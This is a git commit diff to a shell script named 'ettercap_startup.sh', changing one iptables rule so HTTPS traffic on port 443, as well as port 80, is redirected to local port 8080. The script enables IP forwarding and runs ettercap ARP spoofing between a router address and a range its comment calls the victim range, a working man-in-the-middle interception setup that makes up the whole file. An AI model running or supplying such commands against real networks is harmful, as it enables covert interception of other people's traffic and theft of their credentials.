86fa923eb8adfffb7fc445fc35755f10d2b28325
Young Jun Do <youngjundoe@gmail.com>
2018-10-13 13:19:05 -0400

    change one port# from 80 to 443

--- ettercap_startup.sh
+++ ettercap_startup.sh
@@ -3,7 +3,7 @@
 sysctl -w net.ipv4.ip_forward=1
 
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 REDIRECT --to-port 8080
 
 #command works like this:  ettercap -Tq -M arp:remote -i wlan0 -S /<router_ip>// /<victem_ip_range>//
 ettercap -Tq -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//
